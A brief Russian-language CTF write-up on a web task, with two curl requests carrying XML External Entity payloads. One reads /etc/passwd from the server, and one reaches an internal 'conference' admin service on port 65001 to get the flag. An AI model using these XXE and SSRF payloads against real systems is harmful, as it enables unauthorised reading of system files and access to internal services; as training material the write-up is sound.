Подсказка в задании: *сайт имеет доступ к внутреннему сервису conference на порту 65001. Часть админки не заблокирована*
На сайте не работает форма авторизации - POST отправляет запрос, но ответ захардкодчен на странице
замечаем:
**сервер ожидает XML**
значит, можем использовать уязвимость XXE. Проверяем:
```
curl https://steel-curtain.tasks.zeroplus.redshiftctf.ru/login \  
-X POST \  
-H "Content-Type: application/xml" \  
-d '<?xml version="1.0"?>  
<!DOCTYPE foo [  
<!ENTITY xxe SYSTEM "file:///etc/passwd">  
]>  
<login>  
<username>&xxe;</username>  
<password>test</password>  
</login>'
```
Работает.
Теперь самое главное - пытаемся обратиться к админ-панели сервиса conference. 

```
curl https://steel-curtain.tasks.zeroplus.redshiftctf.ru/login \  
-X POST \  
-H "Content-Type: application/xml" \  
-d '<?xml version="1.0"?>  
<!DOCTYPE foo [  
<!ENTITY xxe SYSTEM "conference:65001/admin">  
]>  
<login>  
<username>&xxe;</username>  
<password>test</password>  
</login>'

```

ожидаемо access denied. Обращаемся к `http://conference:65001/admin/flag
Нам нужен флаг:
![[Screenshot_20260315_170920.png]]
Успех!!